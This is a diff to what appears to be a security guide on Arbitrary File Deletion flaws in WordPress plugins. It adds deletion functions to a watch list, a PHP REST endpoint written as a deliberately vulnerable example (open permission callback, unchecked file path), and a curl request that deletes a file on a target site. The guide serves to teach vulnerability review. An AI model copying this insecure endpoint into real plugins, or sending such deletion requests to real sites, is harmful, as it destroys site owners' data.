@@ -17,5 +17,39 @@ Several functions could be useful to identify a possible Arbitrary File Deletion
     - [`rmdir`](https://www.php.net/manual/en/function.rmdir.php)
 
 - WordPress related
+    - [`wp_delete_file`](https://developer.wordpress.org/reference/functions/wp_delete_file/)
+    - [`wp_delete_file_from_directory`](https://developer.wordpress.org/reference/functions/wp_delete_file_from_directory/)
     - [`WP_Filesystem_Direct::delete`](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/delete/)
     - [`WP_Filesystem_Direct::rmdir`](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/rmdir/)
+
+## Example Cases
+
+Below is an example of vulnerable code:
+
+```php
+add_action("init", "rest_init_setup");
+
+function rest_init_setup(){
+    register_rest_route( "myplugin/v1", '/deletemedia/', array(
+        'methods'                   =>  "POST",
+        'callback'                  =>  'delete_media_upload',
+        'permission_callback' => '__return_true',
+    ) );
+}
+
+function delete_media_upload($request){
+    $args = json_decode($request->get_body(),true);
+    $data = array('status'=>false);
+    if(!empty($args['media']) ){
+        wp_delete_file( $args['media']['file'] );
+        $data = array('status'=>true);
+    }
+    return new WP_REST_Response( $data, 200 );
+}
+```
+
+To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-json/myplugin/v1/deletemedia` endpoint specifying the needed parameter to trigger the `wp_delete_file` function.
+
+```bash
+curl <WORDPRESS_BASE_URL>/wp-json/myplugin/v1/deletemedia -d '{"media":{"file":"<WORDPRESS_BASE_DIRECTORY>/license.txt"}}' -H 'Content-Type: application/json'
+```
